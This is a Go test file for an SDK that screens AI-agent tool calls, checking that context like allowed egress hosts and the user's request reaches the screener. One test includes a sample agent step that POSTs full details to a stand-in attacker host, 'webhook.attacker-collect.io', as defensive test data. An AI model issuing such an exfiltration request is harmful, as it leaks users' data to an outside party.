package surface

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"testing"
)

// The context an application supplies is forwarded in the request body under
// "context", with the egress list and user request intact.
func TestScanPayload_ForwardsContext(t *testing.T) {
	var gotBody map[string]any
	c, srv := newTestClient(t, func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		_ = json.Unmarshal(b, &gotBody)
		w.Write([]byte(`{"safetyScore":{"threatLevel":"Clean","recommendedAction":"Allow"}}`))
	})
	defer srv.Close()

	_, err := c.ScanPayload(context.Background(),
		[]byte(`{"tool":"create_payment","args":{"iban":"GB29NWBK60161331926819","amount":18650}}`),
		"payment.json",
		&ScanFileOptions{Context: &ActionContext{
			PrincipalDomains: []string{"acme.io"},
			AllowedEgress:    []string{"api.stripe.com", "hooks.slack.com"},
			UserRequest:      "summarize this week's tickets",
		}},
	)
	if err != nil {
		t.Fatalf("ScanPayload: %v", err)
	}
	ctx, ok := gotBody["context"].(map[string]any)
	if !ok {
		t.Fatalf("request body has no context object: %v", gotBody)
	}
	if ctx["user_request"] != "summarize this week's tickets" {
		t.Errorf("user_request not forwarded: %v", ctx["user_request"])
	}
	egress, ok := ctx["allowed_egress"].([]any)
	if !ok || len(egress) != 2 || egress[0] != "api.stripe.com" {
		t.Errorf("allowed_egress not forwarded: %v", ctx["allowed_egress"])
	}
}

// With no context (or nil options), the body carries no "context" key — the
// server then screens on face value only.
func TestScanPayload_OmitsContextWhenAbsent(t *testing.T) {
	for _, name := range []string{"nil-opts", "nil-context"} {
		var gotBody map[string]any
		c, srv := newTestClient(t, func(w http.ResponseWriter, r *http.Request) {
			b, _ := io.ReadAll(r.Body)
			_ = json.Unmarshal(b, &gotBody)
			w.Write([]byte(`{"safetyScore":{"threatLevel":"Clean","recommendedAction":"Allow"}}`))
		})
		var opts *ScanFileOptions
		if name == "nil-context" {
			opts = &ScanFileOptions{}
		}
		if _, err := c.ScanPayload(context.Background(), []byte("hello"), "x", opts); err != nil {
			t.Fatalf("%s: ScanPayload: %v", name, err)
		}
		srv.Close()
		if _, present := gotBody["context"]; present {
			t.Errorf("%s: context key present in body when none was supplied", name)
		}
	}
}

// Proven value, through the SDK surface: data sent to a host the caller's context
// declares out of scope is flagged for Review, while with no context the same call
// is Allowed. The mock server stands in for the screener's context-aware verdict —
// the engine-level proof lives in tendrl-surface's action-corpus — so this test
// pins that the SDK carries the context that drives the flip.
func TestScanPayload_ContextFlipsVerdict(t *testing.T) {
	host := "webhook.attacker-collect.io"
	verdictFor := func(opts *ScanFileOptions) string {
		c, srv := newTestClient(t, func(w http.ResponseWriter, r *http.Request) {
			b, _ := io.ReadAll(r.Body)
			var body struct {
				Payload string         `json:"payload"`
				Context *ActionContext `json:"context"`
			}
			_ = json.Unmarshal(b, &body)
			// Model the screener: egress to a host outside a declared allowed_egress
			// is Review; with no context to judge "outside", it is Allow.
			action, verdict := "Allow", "Clean"
			if body.Context != nil && len(body.Context.AllowedEgress) > 0 {
				declared := false
				for _, h := range body.Context.AllowedEgress {
					if h == host {
						declared = true
					}
				}
				if !declared {
					action, verdict = "Review", "Suspicious"
				}
			}
			w.Write([]byte(`{"safetyScore":{"threatLevel":"` + verdict + `","recommendedAction":"` + action + `"}}`))
		})
		defer srv.Close()
		payload := []byte(`{"tool":"http_request","args":{"method":"POST","url":"https://` + host + `/i","body":{"full_details":true}}}`)
		res, err := c.ScanPayload(context.Background(), payload, "agent-step.json", opts)
		if err != nil {
			t.Fatalf("ScanPayload: %v", err)
		}
		return res.ScanResult.SafetyScore.RecommendedAction
	}

	if got := verdictFor(&ScanFileOptions{Context: &ActionContext{
		PrincipalDomains: []string{"acme.io"},
		AllowedEgress:    []string{"api.stripe.com"},
	}}); got != "Review" {
		t.Errorf("egress to an undeclared host: got %q, want Review", got)
	}
	if got := verdictFor(nil); got != "Allow" {
		t.Errorf("egress with no context: got %q, want Allow", got)
	}
}
